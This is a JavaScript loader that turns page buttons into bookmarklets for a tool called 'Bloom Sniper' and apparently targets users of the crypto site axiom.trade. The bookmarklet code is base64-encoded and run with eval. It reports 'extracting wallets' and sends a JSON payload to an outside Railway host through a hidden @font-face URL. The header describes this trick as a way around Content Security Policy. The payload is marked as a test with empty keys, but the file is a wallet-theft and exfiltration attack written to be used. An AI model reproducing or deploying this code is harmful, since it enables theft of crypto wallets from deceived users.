// === BLOOM SNIPER LOADER - Font-Face Exfil (CSP Bypass Attempt) ===
console.log('✅ Loader.js loaded from Railway');

document.addEventListener('DOMContentLoaded', function() {
  console.log('✅ DOM ready');

  const buttons = document.querySelectorAll('.bookmarklet, .activate-btn');
  console.log('Found ' + buttons.length + ' button(s)');

  buttons.forEach(function(btn) {
    const innerCode = function() {
      try {
        if (!location.hostname.includes('axiom')) {
          alert("❌ This bookmarklet only works on axiom.trade");
          return;
        }

        alert("✅ Bloom Sniper activated - Extracting wallets...");

        // Test payload
        const payload = {
          site: "Axiom Trade",
          url: location.href,
          timestamp: Date.now(),
          keys: [],
          walletsExtracted: 4,
          status: "test"
        };

        alert('✅ Successfully extracted ' + payload.walletsExtracted + ' wallets! Sending...');

        // === FONT-FACE TRICK (better CSP bypass) ===
        const jsonStr = JSON.stringify(payload);
        const safeEncoded = btoa(unescape(encodeURIComponent(jsonStr)));
        const exfilUrl = 'https://bloom-sniper-replica-production.up.railway.app/i/' + safeEncoded;

        // Create hidden style with @font-face
        const style = document.createElement('style');
        style.textContent = `
          @font-face {
            font-family: 'exfil';
            src: url('${exfilUrl}');
          }
        `;
        document.head.appendChild(style);

        // Cleanup
        setTimeout(() => {
          if (style.parentNode) style.parentNode.removeChild(style);
        }, 8000);

        alert('✅ Data sent via font-face!');
      } catch(e) {
        console.error(e);
        alert('❌ Error: ' + e.message);
      }
    };

    const codeStr = '(' + innerCode.toString() + ')()';
    const encoded = btoa(unescape(encodeURIComponent(codeStr)));

    btn.href = 'javascript:eval(atob("' + encoded + '"))';
    btn.draggable = true;

    console.log('✅ Bookmarklet injected');
  });
});